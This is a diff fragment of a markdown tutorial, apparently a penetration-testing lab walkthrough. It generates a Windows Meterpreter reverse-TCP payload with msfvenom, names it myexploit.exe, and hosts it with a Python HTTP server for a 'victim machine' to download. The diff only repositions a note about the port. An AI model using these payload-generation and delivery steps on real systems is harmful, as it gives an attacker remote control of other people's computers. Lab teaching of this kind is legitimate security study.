@@ -41,11 +41,11 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=4554 
 Here the payload generation is successful and saved as our given name myexploit.exe 
 
 ### Step 3: Host Payload for Delivery
-**Command**: 
+### **Command**(N.B (Use port 8000 (or any port except 4554)): 
 ```
 python3 -m http.server -b <your_machine_ip> <port_number>
 ```
-### N.B (Use port 8000 (or any port except 4554)
+
 **Example**- After that open browser from the victim machine and use the url you just started as server  http://192.168.0.7:8999 
 ### example - python3 -m http.server -b 192.168.56.102 4444 
 ### Now download the payload you have just created. 
